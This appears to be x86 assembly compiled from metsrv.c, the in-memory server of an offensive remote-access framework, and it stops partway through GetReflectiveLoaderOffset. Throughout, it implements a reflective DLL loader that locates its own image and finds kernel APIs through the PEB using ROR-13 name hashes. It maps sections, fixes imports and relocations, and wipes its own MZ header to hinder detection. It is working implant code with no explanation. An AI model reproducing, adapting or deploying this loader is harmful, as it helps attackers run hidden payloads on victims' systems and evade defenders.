	.file	"metsrv.c"
	.text
	.def	_time;	.scl	3;	.type	32;	.endef
_time:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$24, %esp
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp___time32, %eax
	call	*%eax
	leave
	ret
	.globl	_hAppInstance
	.bss
	.align 4
_hAppInstance:
	.space 4
	.text
	.globl	_caller
	.def	_caller;	.scl	2;	.type	32;	.endef
_caller:
	pushl	%ebp
	movl	%esp, %ebp
	movl	4(%ebp), %eax
	popl	%ebp
	ret
	.globl	_ReflectiveLoader@0
	.def	_ReflectiveLoader@0;	.scl	2;	.type	32;	.endef
_ReflectiveLoader@0:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%ebx
	subl	$180, %esp
	movl	$0, -12(%ebp)
	movl	$0, -16(%ebp)
	movl	$0, -20(%ebp)
	movl	$0, -24(%ebp)
	movl	$0, -28(%ebp)
	movl	$0, -32(%ebp)
	call	_caller
	movl	%eax, -40(%ebp)
L8:
	movl	-40(%ebp), %eax
	movzwl	(%eax), %eax
	cmpw	$23117, %ax
	jne	L6
	movl	-40(%ebp), %eax
	movl	60(%eax), %eax
	movl	%eax, -76(%ebp)
	cmpl	$63, -76(%ebp)
	jbe	L6
	cmpl	$1023, -76(%ebp)
	ja	L6
	movl	-40(%ebp), %eax
	addl	%eax, -76(%ebp)
	movl	-76(%ebp), %eax
	movl	(%eax), %eax
	cmpl	$17744, %eax
	je	L68
L6:
	subl	$1, -40(%ebp)
	jmp	L8
L68:
	nop
	movl	-40(%ebp), %eax
	movl	%eax, -80(%ebp)
	movl	-80(%ebp), %eax
	movb	$0, (%eax)
	movl	-80(%ebp), %eax
	addl	$1, %eax
	movb	$0, (%eax)
	movl	$48, -104(%ebp)
	movl	-104(%ebp), %eax
/APP
 # 1997 "/usr/share/mingw-w64/include/psdk_inc/intrin-impl.h" 1
	movl %fs:(%eax), %eax 
 # 0 "" 2
/NO_APP
	movl	%eax, -108(%ebp)
	movl	-108(%ebp), %eax
	movl	%eax, -84(%ebp)
	movl	-84(%ebp), %eax
	movl	12(%eax), %eax
	movl	%eax, -84(%ebp)
	movl	-84(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, -52(%ebp)
	jmp	L10
L41:
	movl	-52(%ebp), %eax
	movl	40(%eax), %eax
	movl	%eax, -56(%ebp)
	movl	-52(%ebp), %eax
	movzwl	36(%eax), %eax
	movw	%ax, -34(%ebp)
	movl	$0, -60(%ebp)
	movl	-60(%ebp), %eax
	movl	%eax, -72(%ebp)
L15:
	movl	-72(%ebp), %eax
	movl	%eax, -112(%ebp)
	movl	-112(%ebp), %eax
	movl	%eax, -116(%ebp)
	movl	$13, -120(%ebp)
	andl	$31, -120(%ebp)
	movl	-120(%ebp), %eax
	movl	-116(%ebp), %edx
	movl	%eax, %ecx
	rorl	%cl, %edx
	movl	%edx, %eax
	nop
	movl	%eax, -72(%ebp)
	movl	-56(%ebp), %eax
	movzbl	(%eax), %eax
	cmpb	$96, %al
	jbe	L13
	movl	-56(%ebp), %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edx
	movl	-72(%ebp), %eax
	addl	%edx, %eax
	subl	$32, %eax
	movl	%eax, -72(%ebp)
	jmp	L14
L13:
	movl	-56(%ebp), %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	addl	%eax, -72(%ebp)
L14:
	addl	$1, -56(%ebp)
	subw	$1, -34(%ebp)
	cmpw	$0, -34(%ebp)
	jne	L15
	movl	-72(%ebp), %eax
	movl	%eax, -60(%ebp)
	cmpl	$1783282779, -60(%ebp)
	jne	L16
	movl	-52(%ebp), %eax
	movl	16(%eax), %eax
	movl	%eax, -84(%ebp)
	movl	-84(%ebp), %eax
	movl	60(%eax), %eax
	movl	%eax, %edx
	movl	-84(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -88(%ebp)
	movl	-88(%ebp), %eax
	addl	$120, %eax
	movl	%eax, -44(%ebp)
	movl	-44(%ebp), %eax
	movl	(%eax), %edx
	movl	-84(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -88(%ebp)
	movl	-88(%ebp), %eax
	movl	32(%eax), %edx
	movl	-84(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -44(%ebp)
	movl	-88(%ebp), %eax
	movl	36(%eax), %edx
	movl	-84(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -48(%ebp)
	movw	$4, -34(%ebp)
	movzwl	-34(%ebp), %eax
	addl	$1, %eax
	movw	%ax, -34(%ebp)
	jmp	L17
L29:
	movl	-44(%ebp), %eax
	movl	(%eax), %edx
	movl	-84(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -124(%ebp)
	movl	$0, %ebx
L20:
	movl	%ebx, -128(%ebp)
	movl	-128(%ebp), %eax
	movl	%eax, -132(%ebp)
	movl	$13, -136(%ebp)
	andl	$31, -136(%ebp)
	movl	-136(%ebp), %eax
	movl	-132(%ebp), %edx
	movl	%eax, %ecx
	rorl	%cl, %edx
	movl	%edx, %eax
	nop
	movl	%eax, %ebx
	movl	-124(%ebp), %eax
	movzbl	(%eax), %eax
	movsbl	%al, %eax
	addl	%eax, %ebx
	addl	$1, -124(%ebp)
	movl	-124(%ebp), %eax
	movzbl	(%eax), %eax
	testb	%al, %al
	jne	L20
	movl	%ebx, %eax
	movl	%eax, -92(%ebp)
	cmpl	$-334606706, -92(%ebp)
	je	L22
	cmpl	$2081291434, -92(%ebp)
	je	L22
	cmpl	$2034681371, -92(%ebp)
	je	L22
	cmpl	$-1850750380, -92(%ebp)
	je	L22
	cmpl	$251015922, -92(%ebp)
	jne	L23
L22:
	movl	-88(%ebp), %eax
	movl	28(%eax), %edx
	movl	-84(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -96(%ebp)
	movl	-48(%ebp), %eax
	movzwl	(%eax), %eax
	movzwl	%ax, %eax
	sall	$2, %eax
	addl	%eax, -96(%ebp)
	cmpl	$-334606706, -92(%ebp)
	jne	L24
	movl	-96(%ebp), %eax
	movl	(%eax), %edx
	movl	-84(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -12(%ebp)
	jmp	L25
L24:
	cmpl	$2081291434, -92(%ebp)
	jne	L26
	movl	-96(%ebp), %eax
	movl	(%eax), %edx
	movl	-84(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -16(%ebp)
	jmp	L25
L26:
	cmpl	$2034681371, -92(%ebp)
	jne	L27
	movl	-96(%ebp), %eax
	movl	(%eax), %edx
	movl	-84(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -20(%ebp)
	jmp	L25
L27:
	cmpl	$-1850750380, -92(%ebp)
	jne	L28
	movl	-96(%ebp), %eax
	movl	(%eax), %edx
	movl	-84(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -24(%ebp)
	jmp	L25
L28:
	cmpl	$251015922, -92(%ebp)
	jne	L25
	movl	-96(%ebp), %eax
	movl	(%eax), %edx
	movl	-84(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -32(%ebp)
L25:
	movzwl	-34(%ebp), %eax
	subl	$1, %eax
	movw	%ax, -34(%ebp)
L23:
	addl	$4, -44(%ebp)
	addl	$2, -48(%ebp)
L17:
	cmpw	$0, -34(%ebp)
	jne	L29
	jmp	L30
L16:
	cmpl	$1023043677, -60(%ebp)
	jne	L30
	movl	-52(%ebp), %eax
	movl	16(%eax), %eax
	movl	%eax, -84(%ebp)
	movl	-84(%ebp), %eax
	movl	60(%eax), %eax
	movl	%eax, %edx
	movl	-84(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -88(%ebp)
	movl	-88(%ebp), %eax
	addl	$120, %eax
	movl	%eax, -44(%ebp)
	movl	-44(%ebp), %eax
	movl	(%eax), %edx
	movl	-84(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -88(%ebp)
	movl	-88(%ebp), %eax
	movl	32(%eax), %edx
	movl	-84(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -44(%ebp)
	movl	-88(%ebp), %eax
	movl	36(%eax), %edx
	movl	-84(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -48(%ebp)
	movw	$1, -34(%ebp)
	jmp	L31
L38:
	movl	-44(%ebp), %eax
	movl	(%eax), %edx
	movl	-84(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -140(%ebp)
	movl	$0, %ebx
L34:
	movl	%ebx, -144(%ebp)
	movl	-144(%ebp), %eax
	movl	%eax, -148(%ebp)
	movl	$13, -152(%ebp)
	andl	$31, -152(%ebp)
	movl	-152(%ebp), %eax
	movl	-148(%ebp), %edx
	movl	%eax, %ecx
	rorl	%cl, %edx
	movl	%edx, %eax
	nop
	movl	%eax, %ebx
	movl	-140(%ebp), %eax
	movzbl	(%eax), %eax
	movsbl	%al, %eax
	addl	%eax, %ebx
	addl	$1, -140(%ebp)
	movl	-140(%ebp), %eax
	movzbl	(%eax), %eax
	testb	%al, %al
	jne	L34
	movl	%ebx, %eax
	movl	%eax, -92(%ebp)
	cmpl	$1397492408, -92(%ebp)
	jne	L36
	movl	-88(%ebp), %eax
	movl	28(%eax), %edx
	movl	-84(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -96(%ebp)
	movl	-48(%ebp), %eax
	movzwl	(%eax), %eax
	movzwl	%ax, %eax
	sall	$2, %eax
	addl	%eax, -96(%ebp)
	cmpl	$1397492408, -92(%ebp)
	jne	L37
	movl	-96(%ebp), %eax
	movl	(%eax), %edx
	movl	-84(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -28(%ebp)
L37:
	movzwl	-34(%ebp), %eax
	subl	$1, %eax
	movw	%ax, -34(%ebp)
L36:
	addl	$4, -44(%ebp)
	addl	$2, -48(%ebp)
L31:
	cmpw	$0, -34(%ebp)
	jne	L38
L30:
	cmpl	$0, -12(%ebp)
	je	L39
	cmpl	$0, -16(%ebp)
	je	L39
	cmpl	$0, -20(%ebp)
	je	L39
	cmpl	$0, -24(%ebp)
	je	L39
	cmpl	$0, -32(%ebp)
	je	L39
	cmpl	$0, -28(%ebp)
	jne	L69
L39:
	movl	-52(%ebp), %eax
	movl	(%eax), %eax
	movl	%eax, -52(%ebp)
L10:
	cmpl	$0, -52(%ebp)
	jne	L41
	jmp	L40
L69:
	nop
L40:
	movl	-40(%ebp), %eax
	movl	60(%eax), %eax
	movl	%eax, %edx
	movl	-40(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -76(%ebp)
	movl	-76(%ebp), %eax
	movl	80(%eax), %eax
	movl	$4, 12(%esp)
	movl	$12288, 8(%esp)
	movl	%eax, 4(%esp)
	movl	$0, (%esp)
	movl	-24(%ebp), %eax
	call	*%eax
	subl	$16, %esp
	movl	%eax, -84(%ebp)
	movl	-76(%ebp), %eax
	movl	80(%eax), %edx
	movl	-84(%ebp), %eax
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	movl	-32(%ebp), %eax
	call	*%eax
	subl	$8, %esp
	movl	-76(%ebp), %eax
	movl	84(%eax), %eax
	movl	%eax, -52(%ebp)
	movl	-40(%ebp), %eax
	movl	%eax, -56(%ebp)
	movl	-84(%ebp), %eax
	movl	%eax, -60(%ebp)
	jmp	L42
L43:
	movl	-56(%ebp), %eax
	leal	1(%eax), %edx
	movl	%edx, -56(%ebp)
	movl	%eax, %ecx
	movl	-60(%ebp), %eax
	leal	1(%eax), %edx
	movl	%edx, -60(%ebp)
	movl	%eax, %edx
	movzbl	(%ecx), %eax
	movb	%al, (%edx)
L42:
	movl	-52(%ebp), %eax
	leal	-1(%eax), %edx
	movl	%edx, -52(%ebp)
	testl	%eax, %eax
	jne	L43
	movl	-76(%ebp), %eax
	addl	$24, %eax
	movl	%eax, %edx
	movl	-76(%ebp), %eax
	movzwl	20(%eax), %eax
	movzwl	%ax, %eax
	addl	%edx, %eax
	movl	%eax, -52(%ebp)
	movl	-76(%ebp), %eax
	movzwl	6(%eax), %eax
	movzwl	%ax, %eax
	movl	%eax, -68(%ebp)
	jmp	L44
L47:
	movl	-52(%ebp), %eax
	movl	12(%eax), %edx
	movl	-84(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -56(%ebp)
	movl	-52(%ebp), %eax
	movl	20(%eax), %edx
	movl	-40(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -60(%ebp)
	movl	-52(%ebp), %eax
	movl	16(%eax), %eax
	movl	%eax, -64(%ebp)
	jmp	L45
L46:
	movl	-60(%ebp), %eax
	leal	1(%eax), %edx
	movl	%edx, -60(%ebp)
	movl	%eax, %ecx
	movl	-56(%ebp), %eax
	leal	1(%eax), %edx
	movl	%edx, -56(%ebp)
	movl	%eax, %edx
	movzbl	(%ecx), %eax
	movb	%al, (%edx)
L45:
	movl	-64(%ebp), %eax
	leal	-1(%eax), %edx
	movl	%edx, -64(%ebp)
	testl	%eax, %eax
	jne	L46
	addl	$40, -52(%ebp)
L44:
	movl	-68(%ebp), %eax
	leal	-1(%eax), %edx
	movl	%edx, -68(%ebp)
	testl	%eax, %eax
	jne	L47
	movl	-76(%ebp), %eax
	subl	$-128, %eax
	movl	%eax, -56(%ebp)
	movl	-56(%ebp), %eax
	movl	(%eax), %edx
	movl	-84(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -60(%ebp)
	jmp	L48
L54:
	movl	-60(%ebp), %eax
	movl	12(%eax), %edx
	movl	-84(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, (%esp)
	movl	-12(%ebp), %eax
	call	*%eax
	subl	$4, %esp
	movl	%eax, -40(%ebp)
	cmpl	$0, -40(%ebp)
	jne	L49
	addl	$20, -60(%ebp)
	jmp	L48
L49:
	movl	-60(%ebp), %eax
	movl	(%eax), %edx
	movl	-84(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -64(%ebp)
	movl	-60(%ebp), %eax
	movl	16(%eax), %edx
	movl	-84(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -52(%ebp)
	jmp	L50
L53:
	cmpl	$0, -64(%ebp)
	je	L51
	movl	-64(%ebp), %eax
	movl	(%eax), %eax
	testl	%eax, %eax
	jns	L51
	movl	-40(%ebp), %eax
	movl	60(%eax), %eax
	movl	%eax, %edx
	movl	-40(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -88(%ebp)
	movl	-88(%ebp), %eax
	addl	$120, %eax
	movl	%eax, -44(%ebp)
	movl	-44(%ebp), %eax
	movl	(%eax), %edx
	movl	-40(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -88(%ebp)
	movl	-88(%ebp), %eax
	movl	28(%eax), %edx
	movl	-40(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -96(%ebp)
	movl	-64(%ebp), %eax
	movl	(%eax), %eax
	movzwl	%ax, %edx
	movl	-88(%ebp), %eax
	movl	16(%eax), %eax
	subl	%eax, %edx
	movl	%edx, %eax
	sall	$2, %eax
	addl	%eax, -96(%ebp)
	movl	-96(%ebp), %eax
	movl	(%eax), %ecx
	movl	-52(%ebp), %eax
	movl	-40(%ebp), %edx
	addl	%ecx, %edx
	movl	%edx, (%eax)
	jmp	L52
L51:
	movl	-52(%ebp), %eax
	movl	(%eax), %edx
	movl	-84(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -56(%ebp)
	movl	-56(%ebp), %eax
	leal	2(%eax), %edx
	movl	-40(%ebp), %eax
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	movl	-16(%ebp), %eax
	call	*%eax
	subl	$8, %esp
	movl	%eax, %edx
	movl	-52(%ebp), %eax
	movl	%edx, (%eax)
L52:
	addl	$4, -52(%ebp)
	cmpl	$0, -64(%ebp)
	je	L50
	addl	$4, -64(%ebp)
L50:
	movl	-52(%ebp), %eax
	movl	(%eax), %eax
	testl	%eax, %eax
	jne	L53
	addl	$20, -60(%ebp)
L48:
	movl	-60(%ebp), %eax
	movl	(%eax), %eax
	testl	%eax, %eax
	jne	L54
	movl	-76(%ebp), %eax
	movl	52(%eax), %eax
	movl	-84(%ebp), %edx
	subl	%eax, %edx
	movl	%edx, %eax
	movl	%eax, -40(%ebp)
	movl	-76(%ebp), %eax
	addl	$160, %eax
	movl	%eax, -56(%ebp)
	movl	-56(%ebp), %eax
	movl	4(%eax), %eax
	testl	%eax, %eax
	je	L55
	movl	-56(%ebp), %eax
	movl	4(%eax), %eax
	movl	%eax, -68(%ebp)
	movl	-56(%ebp), %eax
	movl	(%eax), %edx
	movl	-84(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -60(%ebp)
	jmp	L56
L63:
	movl	-60(%ebp), %eax
	movl	(%eax), %edx
	movl	-84(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -52(%ebp)
	movl	-60(%ebp), %eax
	movl	4(%eax), %eax
	subl	$8, %eax
	shrl	%eax
	movl	%eax, -56(%ebp)
	movl	-60(%ebp), %eax
	addl	$8, %eax
	movl	%eax, -64(%ebp)
	jmp	L57
L62:
	movl	-64(%ebp), %eax
	movzbl	1(%eax), %eax
	andl	$-16, %eax
	cmpb	$-96, %al
	jne	L58
	movl	-64(%ebp), %eax
	movzwl	(%eax), %eax
	andw	$4095, %ax
	movzwl	%ax, %edx
	movl	-52(%ebp), %eax
	addl	%edx, %eax
	movl	(%eax), %edx
	movl	-64(%ebp), %eax
	movzwl	(%eax), %eax
	andw	$4095, %ax
	movzwl	%ax, %ecx
	movl	-52(%ebp), %eax
	addl	%ecx, %eax
	movl	%eax, %ecx
	movl	-40(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, (%ecx)
	jmp	L59
L58:
	movl	-64(%ebp), %eax
	movzbl	1(%eax), %eax
	andl	$-16, %eax
	cmpb	$48, %al
	jne	L60
	movl	-64(%ebp), %eax
	movzwl	(%eax), %eax
	andw	$4095, %ax
	movzwl	%ax, %edx
	movl	-52(%ebp), %eax
	addl	%edx, %eax
	movl	(%eax), %edx
	movl	-64(%ebp), %eax
	movzwl	(%eax), %eax
	andw	$4095, %ax
	movzwl	%ax, %ecx
	movl	-52(%ebp), %eax
	addl	%ecx, %eax
	movl	%eax, %ecx
	movl	-40(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, (%ecx)
	jmp	L59
L60:
	movl	-64(%ebp), %eax
	movzbl	1(%eax), %eax
	andl	$-16, %eax
	cmpb	$16, %al
	jne	L61
	movl	-64(%ebp), %eax
	movzwl	(%eax), %eax
	andw	$4095, %ax
	movzwl	%ax, %edx
	movl	-52(%ebp), %eax
	addl	%edx, %eax
	movzwl	(%eax), %edx
	movl	-40(%ebp), %eax
	shrl	$16, %eax
	movl	%eax, %ebx
	movl	-64(%ebp), %eax
	movzwl	(%eax), %eax
	andw	$4095, %ax
	movzwl	%ax, %ecx
	movl	-52(%ebp), %eax
	addl	%ecx, %eax
	movl	%eax, %ecx
	leal	(%edx,%ebx), %eax
	movw	%ax, (%ecx)
	jmp	L59
L61:
	movl	-64(%ebp), %eax
	movzbl	1(%eax), %eax
	andl	$-16, %eax
	cmpb	$32, %al
	jne	L59
	movl	-64(%ebp), %eax
	movzwl	(%eax), %eax
	andw	$4095, %ax
	movzwl	%ax, %edx
	movl	-52(%ebp), %eax
	addl	%edx, %eax
	movzwl	(%eax), %edx
	movl	-40(%ebp), %eax
	movl	%eax, %ebx
	movl	-64(%ebp), %eax
	movzwl	(%eax), %eax
	andw	$4095, %ax
	movzwl	%ax, %ecx
	movl	-52(%ebp), %eax
	addl	%ecx, %eax
	movl	%eax, %ecx
	leal	(%edx,%ebx), %eax
	movw	%ax, (%ecx)
L59:
	addl	$2, -64(%ebp)
L57:
	movl	-56(%ebp), %eax
	leal	-1(%eax), %edx
	movl	%edx, -56(%ebp)
	testl	%eax, %eax
	jne	L62
	movl	-60(%ebp), %eax
	movl	4(%eax), %eax
	subl	%eax, -68(%ebp)
	movl	-60(%ebp), %eax
	movl	4(%eax), %eax
	addl	%eax, -60(%ebp)
L56:
	cmpl	$0, -68(%ebp)
	je	L55
	movl	-60(%ebp), %eax
	movl	4(%eax), %eax
	testl	%eax, %eax
	jne	L63
L55:
	movl	-76(%ebp), %eax
	movl	40(%eax), %edx
	movl	-84(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -52(%ebp)
	movl	$0, 8(%esp)
	movl	$0, 4(%esp)
	movl	$-1, (%esp)
	movl	-28(%ebp), %eax
	call	*%eax
	subl	$12, %esp
	movl	-52(%ebp), %eax
	movl	-84(%ebp), %edx
	movl	$0, 8(%esp)
	movl	$1, 4(%esp)
	movl	%edx, (%esp)
	call	*%eax
	subl	$12, %esp
	movl	$0, -156(%ebp)
	movl	-76(%ebp), %eax
	movl	80(%eax), %edx
	movl	-84(%ebp), %eax
	leal	-156(%ebp), %ecx
	movl	%ecx, 12(%esp)
	movl	$32, 8(%esp)
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	movl	-20(%ebp), %eax
	call	*%eax
	subl	$16, %esp
	movl	%eax, -100(%ebp)
	cmpl	$0, -100(%ebp)
	je	L64
	movl	-52(%ebp), %eax
	jmp	L66
L64:
	movl	$0, %eax
L66:
	movl	-4(%ebp), %ebx
	leave
	ret
	.globl	_GetProcAddressR@8
	.def	_GetProcAddressR@8;	.scl	2;	.type	32;	.endef
_GetProcAddressR@8:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$72, %esp
	movl	$0, -28(%ebp)
	movl	$0, -12(%ebp)
	cmpl	$0, 8(%ebp)
	jne	L71
	movl	$0, %eax
	jmp	L72
L71:
	movl	8(%ebp), %eax
	movl	%eax, -28(%ebp)
	movl	$0, -32(%ebp)
	movl	$0, -16(%ebp)
	movl	$0, -20(%ebp)
	movl	$0, -36(%ebp)
	movl	$0, -40(%ebp)
	movl	$0, -44(%ebp)
	movl	-28(%ebp), %eax
	movl	60(%eax), %eax
	movl	%eax, %edx
	movl	-28(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -36(%ebp)
	movl	-36(%ebp), %eax
	addl	$120, %eax
	movl	%eax, -40(%ebp)
	movl	-40(%ebp), %eax
	movl	(%eax), %edx
	movl	-28(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -44(%ebp)
	movl	-44(%ebp), %eax
	movl	28(%eax), %edx
	movl	-28(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -32(%ebp)
	movl	-44(%ebp), %eax
	movl	32(%eax), %edx
	movl	-28(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -16(%ebp)
	movl	-44(%ebp), %eax
	movl	36(%eax), %edx
	movl	-28(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -20(%ebp)
	movl	12(%ebp), %eax
	shrl	$16, %eax
	testl	%eax, %eax
	jne	L73
	movl	12(%ebp), %eax
	movzwl	%ax, %edx
	movl	-44(%ebp), %eax
	movl	16(%eax), %eax
	subl	%eax, %edx
	movl	%edx, %eax
	sall	$2, %eax
	addl	%eax, -32(%ebp)
	movl	-32(%ebp), %eax
	movl	(%eax), %edx
	movl	-28(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -12(%ebp)
	jmp	L78
L73:
	movl	-44(%ebp), %eax
	movl	24(%eax), %eax
	movl	%eax, -24(%ebp)
	jmp	L75
L77:
	movl	-16(%ebp), %eax
	movl	(%eax), %edx
	movl	-28(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -48(%ebp)
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-48(%ebp), %eax
	movl	%eax, (%esp)
	call	_strcmp
	testl	%eax, %eax
	jne	L76
	movl	-20(%ebp), %eax
	movzwl	(%eax), %eax
	movzwl	%ax, %eax
	sall	$2, %eax
	addl	%eax, -32(%ebp)
	movl	-32(%ebp), %eax
	movl	(%eax), %edx
	movl	-28(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -12(%ebp)
	jmp	L78
L76:
	addl	$4, -16(%ebp)
	addl	$2, -20(%ebp)
L75:
	movl	-24(%ebp), %eax
	leal	-1(%eax), %edx
	movl	%edx, -24(%ebp)
	testl	%eax, %eax
	jne	L77
L78:
	movl	-12(%ebp), %eax
L72:
	leave
	ret	$8
	.globl	_Rva2Offset
	.def	_Rva2Offset;	.scl	2;	.type	32;	.endef
_Rva2Offset:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$16, %esp
	movw	$0, -2(%ebp)
	movl	$0, -8(%ebp)
	movl	$0, -12(%ebp)
	movl	$0, -16(%ebp)
	cmpl	$0, 16(%ebp)
	je	L80
	movl	12(%ebp), %eax
	movl	60(%eax), %eax
	movl	%eax, %edx
	movl	12(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -16(%ebp)
	movl	-16(%ebp), %eax
	addl	$24, %eax
	movl	%eax, %edx
	movl	-16(%ebp), %eax
	movzwl	20(%eax), %eax
	movzwl	%ax, %eax
	addl	%edx, %eax
	movl	%eax, -8(%ebp)
	movl	-8(%ebp), %eax
	movl	20(%eax), %eax
	cmpl	%eax, 8(%ebp)
	jnb	L81
	movl	8(%ebp), %eax
	jmp	L82
L81:
	movw	$0, -2(%ebp)
	jmp	L83
L85:
	movzwl	-2(%ebp), %edx
	movl	%edx, %eax
	sall	$2, %eax
	addl	%edx, %eax
	sall	$3, %eax
	movl	%eax, %edx
	movl	-8(%ebp), %eax
	addl	%edx, %eax
	movl	12(%eax), %eax
	cmpl	%eax, 8(%ebp)
	jb	L84
	movzwl	-2(%ebp), %edx
	movl	%edx, %eax
	sall	$2, %eax
	addl	%edx, %eax
	sall	$3, %eax
	movl	%eax, %edx
	movl	-8(%ebp), %eax
	addl	%edx, %eax
	movl	12(%eax), %ecx
	movzwl	-2(%ebp), %edx
	movl	%edx, %eax
	sall	$2, %eax
	addl	%edx, %eax
	sall	$3, %eax
	movl	%eax, %edx
	movl	-8(%ebp), %eax
	addl	%edx, %eax
	movl	16(%eax), %eax
	addl	%ecx, %eax
	cmpl	%eax, 8(%ebp)
	jnb	L84
	movzwl	-2(%ebp), %edx
	movl	%edx, %eax
	sall	$2, %eax
	addl	%edx, %eax
	sall	$3, %eax
	movl	%eax, %edx
	movl	-8(%ebp), %eax
	addl	%edx, %eax
	movl	12(%eax), %eax
	movl	8(%ebp), %edx
	movl	%edx, %ecx
	subl	%eax, %ecx
	movzwl	-2(%ebp), %edx
	movl	%edx, %eax
	sall	$2, %eax
	addl	%edx, %eax
	sall	$3, %eax
	movl	%eax, %edx
	movl	-8(%ebp), %eax
	addl	%edx, %eax
	movl	20(%eax), %eax
	addl	%ecx, %eax
	jmp	L82
L84:
	movzwl	-2(%ebp), %eax
	addl	$1, %eax
	movw	%ax, -2(%ebp)
L83:
	movl	-16(%ebp), %eax
	movzwl	6(%eax), %eax
	cmpw	%ax, -2(%ebp)
	jb	L85
	jmp	L86
L80:
	movl	12(%ebp), %eax
	movl	60(%eax), %eax
	movl	%eax, %edx
	movl	12(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -12(%ebp)
	movl	-12(%ebp), %eax
	addl	$24, %eax
	movl	%eax, %edx
	movl	-12(%ebp), %eax
	movzwl	20(%eax), %eax
	movzwl	%ax, %eax
	addl	%edx, %eax
	movl	%eax, -8(%ebp)
	movl	-8(%ebp), %eax
	movl	20(%eax), %eax
	cmpl	%eax, 8(%ebp)
	jnb	L87
	movl	8(%ebp), %eax
	jmp	L82
L87:
	movw	$0, -2(%ebp)
	jmp	L88
L90:
	movzwl	-2(%ebp), %edx
	movl	%edx, %eax
	sall	$2, %eax
	addl	%edx, %eax
	sall	$3, %eax
	movl	%eax, %edx
	movl	-8(%ebp), %eax
	addl	%edx, %eax
	movl	12(%eax), %eax
	cmpl	%eax, 8(%ebp)
	jb	L89
	movzwl	-2(%ebp), %edx
	movl	%edx, %eax
	sall	$2, %eax
	addl	%edx, %eax
	sall	$3, %eax
	movl	%eax, %edx
	movl	-8(%ebp), %eax
	addl	%edx, %eax
	movl	12(%eax), %ecx
	movzwl	-2(%ebp), %edx
	movl	%edx, %eax
	sall	$2, %eax
	addl	%edx, %eax
	sall	$3, %eax
	movl	%eax, %edx
	movl	-8(%ebp), %eax
	addl	%edx, %eax
	movl	16(%eax), %eax
	addl	%ecx, %eax
	cmpl	%eax, 8(%ebp)
	jnb	L89
	movzwl	-2(%ebp), %edx
	movl	%edx, %eax
	sall	$2, %eax
	addl	%edx, %eax
	sall	$3, %eax
	movl	%eax, %edx
	movl	-8(%ebp), %eax
	addl	%edx, %eax
	movl	12(%eax), %eax
	movl	8(%ebp), %edx
	movl	%edx, %ecx
	subl	%eax, %ecx
	movzwl	-2(%ebp), %edx
	movl	%edx, %eax
	sall	$2, %eax
	addl	%edx, %eax
	sall	$3, %eax
	movl	%eax, %edx
	movl	-8(%ebp), %eax
	addl	%edx, %eax
	movl	20(%eax), %eax
	addl	%ecx, %eax
	jmp	L82
L89:
	movzwl	-2(%ebp), %eax
	addl	$1, %eax
	movw	%ax, -2(%ebp)
L88:
	movl	-12(%ebp), %eax
	movzwl	6(%eax), %eax
	cmpw	%ax, -2(%ebp)
	jb	L90
L86:
	movl	$0, %eax
L82:
	leave
	ret
	.globl	_GetReflectiveLoaderOffset
	.def	_GetReflectiveLoaderOffset;	.scl	2;	.type	32;	.endef
_GetReflectiveLoaderOffset:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$56, %esp
	movl	$0, -28(%ebp)
	movl	$0, -32(%ebp)
	movl	$0, -12(%ebp)
	movl	$0, -36(%ebp)
	movl	$0, -16(%ebp)
	movl	$0, -20(%ebp)
	movl	$0, -24(%ebp)
	movl	8(%ebp), %eax
	movl	%eax, -28(%ebp)
	movl	-28(%ebp), %eax
	movl	60(%eax), %eax
	movl	%eax, %edx
	movl	-28(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -32(%ebp)
